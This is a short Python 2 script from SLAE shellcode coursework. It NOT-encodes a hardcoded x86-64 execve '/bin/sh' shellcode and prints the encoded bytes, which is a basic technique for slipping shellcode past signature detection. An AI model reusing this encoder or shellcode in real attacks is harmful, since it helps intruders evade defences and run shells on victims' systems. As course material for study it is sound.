#!/usr/bin/python


# File: not-encoder.py
# Author: Kevin Ren, originally professor Viviek from SLAE
# Purpose: to encode given string of shellcode using NOT (complement) operation
#		and the output the result onto stdout


shellcode = (\
"\xeb\x1b\x5f\x48\x31\xc0\x88\x47\x07\x48\x89\x7f\x08\x48\x89\x47\x10\x48\x8d\x77\x08\x48\x8d\x57\x10\xb0\x3b\x0f\x05\xe8\xe0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43")


encoded = ""					# initialize output strings
encoded2 = ""


print "[*] Encoded Shellcode..."

for byte in bytearray(shellcode):
	output = ~ byte				# NOT operate on each byte
	
	encoded += "\\x"			# add each encoded byte to the results string
	encoded += "%02x" % (output & 0xFF)	# and bit wise operation with all bits to 1, results in its original bits
						# because it is needed for the not operation to work properly
	encoded2 += "0x"
	encoded2 += "%02x," % (output & 0xFF)


print encoded					# output to system
print encoded2


print "Length : %d" % (len(bytearray(shellcode)))
